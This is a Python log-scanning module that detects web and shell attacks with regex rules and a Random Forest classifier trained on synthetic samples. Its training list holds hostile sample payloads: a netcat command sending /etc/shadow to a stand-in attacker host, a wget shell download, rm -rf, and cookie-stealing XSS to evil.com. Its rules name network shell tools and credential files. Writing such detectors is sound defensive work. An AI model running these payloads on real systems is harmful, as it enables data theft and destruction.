"""
Cybersecurity Attack Detection Module
--------------------------------------
Two-tier detection system:
  1. Rule-based regex pattern matching (high precision)
  2. Random Forest ML classifier (trained on synthetic feature data)
"""

import os
import re
import math
import numpy as np
import joblib
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split

MODEL_PATH = os.path.join(os.path.dirname(__file__), "ml_model.pkl")

# ═══════════════════════════════════════════════════════════
#  RULE-BASED PATTERNS (Tier 1)
# ═══════════════════════════════════════════════════════════

ATTACK_PATTERNS = {
    "SQL Injection": {
        "patterns": [
            r"(?i)(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER)\b\s+.*(FROM|INTO|TABLE|SET|ALL)\b)",
            r"(?i)(\bOR\b\s+\d+\s*=\s*\d+)",
            r"(?i)(\bAND\b\s+\d+\s*=\s*\d+)",
            r"(?i)(--|;)\s*(DROP|SELECT|INSERT|DELETE|UPDATE)",
            r"(?i)(\'\s*(OR|AND)\s*\'?\d*\'?\s*=\s*\'?\d*)",
            r"(?i)(UNION\s+(ALL\s+)?SELECT)",
            r"(?i)(SLEEP\s*\(\s*\d+\s*\))",
            r"(?i)(BENCHMARK\s*\()",
            r"(?i)(CHAR\s*\(\s*\d+\s*\))",
            r"(?i)(\bWAITFOR\b\s+\bDELAY\b)",
        ],
        "severity": "Critical",
    },
    "XSS": {
        "patterns": [
            r"(?i)<\s*script[^>]*>",
            r"(?i)on(load|error|click|mouseover|focus|blur|submit)\s*=",
            r"(?i)javascript\s*:",
            r"(?i)<\s*img[^>]+on\w+\s*=",
            r"(?i)<\s*svg[^>]*on\w+\s*=",
            r"(?i)<\s*iframe",
            r"(?i)document\.(cookie|write|location)",
            r"(?i)eval\s*\(",
            r"(?i)alert\s*\(",
            r"(?i)<\s*body[^>]+on\w+\s*=",
        ],
        "severity": "High",
    },
    "Path Traversal": {
        "patterns": [
            r"\.\./",
            r"\.\.\\",
            r"(?i)/etc/(passwd|shadow|hosts)",
            r"(?i)(c:\\|C:\\)(windows|boot\.ini)",
            r"(?i)%2e%2e[%2f/\\]",
            r"(?i)%252e%252e%252f",
        ],
        "severity": "High",
    },
    "Command Injection": {
        "patterns": [
            r";\s*(ls|cat|rm|wget|curl|chmod|chown|nc|bash|sh|python|perl)\b",
            r"\|\s*(ls|cat|rm|wget|curl|chmod|chown|nc|bash|sh|python|perl)\b",
            r"`[^`]*`",
            r"\$\([^)]*\)",
            r"(?i)\b(exec|system|passthru|popen|proc_open|shell_exec)\s*\(",
        ],
        "severity": "Critical",
    },
    "LDAP Injection": {
        "patterns": [
            r"[)(|*\\]\s*(uid|cn|sn|mail|objectClass)\s*=",
            r"(?i)\(\|?\s*\(\w+=\*\)\s*\)",
            r"(?i)%28%7C%28",
        ],
        "severity": "Medium",
    },
    "Log Forging": {
        "patterns": [
            r"(\r\n|\r|\n).*(INFO|WARN|ERROR|DEBUG)\s*:",
            r"(?i)%0[ad]",
        ],
        "severity": "Medium",
    },
}


def _rule_based_detect(line: str) -> list[dict]:
    """
    Scan a single line against all regex patterns.
    Returns a list of detected threats.
    """
    results = []
    for attack_type, info in ATTACK_PATTERNS.items():
        for pattern in info["patterns"]:
            match = re.search(pattern, line)
            if match:
                results.append(
                    {
                        "attack_type": attack_type,
                        "severity": info["severity"],
                        "matched_pattern": match.group(0)[:200],
                    }
                )
                break  # One match per attack type per line
    return results


# ═══════════════════════════════════════════════════════════
#  ML-BASED CLASSIFIER (Tier 2)
# ═══════════════════════════════════════════════════════════

def _shannon_entropy(s: str) -> float:
    """Calculate Shannon entropy of a string."""
    if not s:
        return 0.0
    prob = [float(s.count(c)) / len(s) for c in set(s)]
    return -sum(p * math.log2(p) for p in prob if p > 0)


def _extract_features(line: str) -> list[float]:
    """
    Extract numerical features from a log line for ML classification.
    Features: length, special char counts, keyword counts, entropy, etc.
    """
    return [
        len(line),
        line.count("'"),
        line.count('"'),
        line.count(";"),
        line.count("-"),
        line.count("<"),
        line.count(">"),
        line.count("("),
        line.count(")"),
        line.count("/"),
        line.count("\\"),
        line.count("|"),
        line.count("="),
        sum(1 for c in line if not c.isalnum() and c != " "),  # total special chars
        sum(1 for word in ["select", "union", "drop", "insert", "delete", "update", "exec"]
            if word in line.lower()),  # SQL keyword count
        sum(1 for word in ["script", "alert", "eval", "onerror", "onload", "javascript"]
            if word in line.lower()),  # XSS keyword count
        sum(1 for word in ["../", "etc/passwd", "cmd.exe", "bin/sh", "wget", "curl"]
            if word in line.lower()),  # injection keyword count
        _shannon_entropy(line),
        float(len(line.split())),  # word count
        sum(1 for c in line if c.isupper()) / max(len(line), 1),  # uppercase ratio
    ]


def _generate_synthetic_data(n_samples: int = 2000):
    """Generate synthetic training data for the classifier."""
    np.random.seed(42)

    attack_samples = [
        "SELECT * FROM users WHERE id = 1 OR 1=1 --",
        "'; DROP TABLE users; --",
        "UNION ALL SELECT username, password FROM admin",
        "1' AND SLEEP(5) --",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "javascript:void(document.location='http://evil.com/?c='+document.cookie)",
        "<svg onload=alert(1)>",
        "../../etc/passwd",
        "../../../windows/system32/config/sam",
        "; cat /etc/shadow | nc attacker.com 4444",
        "| wget http://malware.com/shell.sh",
        "$(rm -rf /)",
        "`id`",
        "admin' OR '1'='1",
        "1; UPDATE users SET role='admin' WHERE id=1",
        "<iframe src='http://evil.com/phish.html'>",
        "exec('import os; os.system(\"rm -rf /\")')",
        "BENCHMARK(1000000,SHA1('test'))",
        "WAITFOR DELAY '00:00:10'",
    ]

    clean_samples = [
        "2026-02-19 10:23:45 INFO User admin logged in successfully",
        "2026-02-19 10:24:01 INFO Page /dashboard loaded in 234ms",
        "2026-02-19 10:24:15 INFO Database query completed: 45 rows returned",
        "2026-02-19 10:25:00 WARN High memory usage detected: 85%",
        "2026-02-19 10:25:30 INFO File report_q4.pdf downloaded by user john",
        "2026-02-19 10:26:00 INFO Session created for user: mary@company.com",
        "2026-02-19 10:26:45 DEBUG Cache hit ratio: 92.3%",
        "2026-02-19 10:27:00 INFO Scheduled backup started",
        "2026-02-19 10:27:30 INFO Email notification sent to admin@corp.com",
        "2026-02-19 10:28:00 INFO API request GET /api/users returned 200",
        "GET /index.html 200 OK 15ms",
        "POST /api/login 200 OK 120ms",
        "Connection established from 192.168.1.100",
        "SSL handshake completed successfully",
        "Firewall rule updated: allow port 443",
        "Disk usage check: /var/log at 45%",
        "Service nginx restarted successfully",
        "Health check passed for endpoint /api/health",
        "Certificate renewal scheduled for 2026-03-15",
        "Load balancer routing updated: 3 active backends",
    ]

    X, y = [], []

    for sample in attack_samples:
        for _ in range(n_samples // (2 * len(attack_samples)) + 1):
            noise = "".join(
                chr(np.random.randint(97, 123)) for _ in range(np.random.randint(0, 10))
            )
            line = f"{noise} {sample} {noise}"
            X.append(_extract_features(line))
            y.append(1)  # Attack

    for sample in clean_samples:
        for _ in range(n_samples // (2 * len(clean_samples)) + 1):
            ts = f"2026-{np.random.randint(1,13):02d}-{np.random.randint(1,29):02d}"
            line = f"{ts} {sample}"
            X.append(_extract_features(line))
            y.append(0)  # Clean

    return np.array(X), np.array(y)


def train_model():
    """Train the Random Forest classifier and save it."""
    print("[*] Training Random Forest classifier on synthetic data...")
    X, y = _generate_synthetic_data(2000)
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, random_state=42
    )

    clf = RandomForestClassifier(
        n_estimators=100, max_depth=10, random_state=42, n_jobs=-1
    )
    clf.fit(X_train, y_train)

    accuracy = clf.score(X_test, y_test)
    print(f"[+] Model trained — Accuracy: {accuracy:.2%}")

    joblib.dump(clf, MODEL_PATH)
    print(f"[+] Model saved to {MODEL_PATH}")
    return clf


def _load_model():
    """Load the trained model, training it first if needed."""
    if os.path.exists(MODEL_PATH):
        return joblib.load(MODEL_PATH)
    return train_model()


# Lazy-loaded model singleton
_model = None


def _get_model():
    global _model
    if _model is None:
        _model = _load_model()
    return _model


# ═══════════════════════════════════════════════════════════
#  PUBLIC API
# ═══════════════════════════════════════════════════════════

def scan_file(filepath: str) -> dict:
    """
    Scan an uploaded log file for cyber threats.

    Returns a dict with:
      - total_lines, total_attacks, clean_lines
      - threats: list of detected threat dicts
      - attack_summary: {attack_type: count}
      - severity_summary: {severity: count}
    """
    model = _get_model()
    threats = []
    total_lines = 0

    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        for i, raw_line in enumerate(f, start=1):
            line = raw_line.strip()
            if not line:
                continue
            total_lines += 1

            # ── Tier 1: Rule-based detection ──
            rule_hits = _rule_based_detect(line)

            # ── Tier 2: ML-based detection ──
            features = np.array([_extract_features(line)])
            ml_prediction = model.predict(features)[0]
            ml_confidence = max(model.predict_proba(features)[0])

            if rule_hits:
                # Use the highest-severity rule hit
                for hit in rule_hits:
                    threats.append(
                        {
                            "line_number": i,
                            "attack_type": hit["attack_type"],
                            "severity": hit["severity"],
                            "matched_pattern": hit["matched_pattern"],
                            "raw_line": line[:500],
                        }
                    )
            elif ml_prediction == 1 and ml_confidence > 0.7:
                threats.append(
                    {
                        "line_number": i,
                        "attack_type": "Suspicious (ML Detected)",
                        "severity": "Medium",
                        "matched_pattern": f"ML confidence: {ml_confidence:.0%}",
                        "raw_line": line[:500],
                    }
                )

    # Build summaries
    attack_summary = {}
    severity_summary = {}
    for t in threats:
        attack_summary[t["attack_type"]] = attack_summary.get(t["attack_type"], 0) + 1
        severity_summary[t["severity"]] = severity_summary.get(t["severity"], 0) + 1

    return {
        "total_lines": total_lines,
        "total_attacks": len(threats),
        "clean_lines": total_lines - len(threats),
        "threats": threats,
        "attack_summary": attack_summary,
        "severity_summary": severity_summary,
    }
